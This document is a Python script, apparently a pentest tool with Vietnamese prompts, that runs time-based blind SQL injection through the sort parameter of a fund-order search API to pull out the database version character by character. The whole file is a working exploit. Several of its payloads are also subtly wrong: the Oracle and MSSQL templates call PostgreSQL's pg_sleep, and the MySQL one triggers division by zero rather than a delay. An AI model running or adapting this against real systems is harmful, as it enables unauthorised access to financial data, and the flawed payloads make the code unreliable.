import requests
import time
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# https://api.example.com:443/ms/inv/fundsystem-om/investor/order/search

base_url = input("Nhập URL endpoint: ")
auth_token = input("Nhập Authorization token: ")

proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
}

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0",
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": "vi",
    "Content-Type": "application/json",
    "Authorization": f"Bearer {auth_token}",
    "Origin": "https://dev.example.com",
    "Referer": "https://dev.example.com/",
    "Connection": "keep-alive"
}

def send_sqli(payload, delay_threshold=4):
    try:
        # Tạo JSON dữ liệu gửi đi
        json_data = {
            "sourceCode": "909",
            "size": 10,
            "sort": ["425"+payload],
            "accountNumber": "909C010766"
        }

        start_time = time.time()  # Ghi lại thời gian bắt đầu
        response = requests.post(base_url, headers=headers, proxies=proxies, json=json_data, verify=False)
        end_time = time.time()  # Ghi lại thời gian kết thúc

        response_time = end_time - start_time  # Tính thời gian phản hồi

        # Kiểm tra xem thời gian phản hồi có vượt quá ngưỡng không (giả sử là 4 giây)
        if response_time >= delay_threshold:
            return True  # Thời gian phản hồi lâu cho thấy ký tự đúng
        else:
            return False  # Thời gian phản hồi ngắn cho thấy ký tự sai
    except requests.exceptions.SSLError as e:
        print(f"SSL error: {e}")
        return None

def extract_db_version(db_type, max_length=100):
    db_version = ""
    chars = "0123456789. abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-._"

    payload_template = {
        1: lambda db_version, char: (  # Oracle
            f"orderId,(SELECT CASE WHEN (SELECT COUNT(*) FROM v$version "
            f"WHERE banner LIKE '{db_version}{char}%') > 0 THEN pg_sleep(4) ELSE pg_sleep(0) END FROM dual)"
        ),
        2: lambda db_version, char: (  # MySQL
            f"orderId,(SELECT IF((SELECT VERSION() LIKE '{db_version}{char}%'), 1/0, NULL))"
        ),
        3: lambda db_version, char: (  # PostgreSQL
            f"orderId,(SELECT CASE WHEN (SELECT version() LIKE '{db_version}{char}%') THEN pg_sleep(4) ELSE pg_sleep(0) END)"
        ),
        4: lambda db_version, char: (  # MSSQL
            f"orderId,(SELECT CASE WHEN (SELECT @@version LIKE '{db_version}{char}%') THEN pg_sleep(4) ELSE pg_sleep(0) END)"
        )
    }

    for i in range(1, max_length + 1):
        found_char = False
        for char in chars:
            payload = payload_template[db_type](db_version, char)
            if send_sqli(payload):
                db_version += char
                print(f"Character found: {char}, current db_version: {db_version}")
                found_char = True
                break
        if not found_char:
            print(f"No more characters found, final db_version: {db_version}")
            break

    return db_version

if __name__ == "__main__":
    print("Chọn loại cơ sở dữ liệu:")
    print("1. Oracle")
    print("2. MySQL")
    print("3. PostgreSQL")
    print("4. MsSQL")
    db_type = int(input("Nhập số tương ứng với loại cơ sở dữ liệu (1-4): "))

    if db_type not in [1, 2, 3, 4]:
        print("Loại cơ sở dữ liệu không hợp lệ.")
    else:
        db_version = extract_db_version(db_type)
        if db_version:
            print(f"Database version: {db_version}")
        else:
            print("Failed")
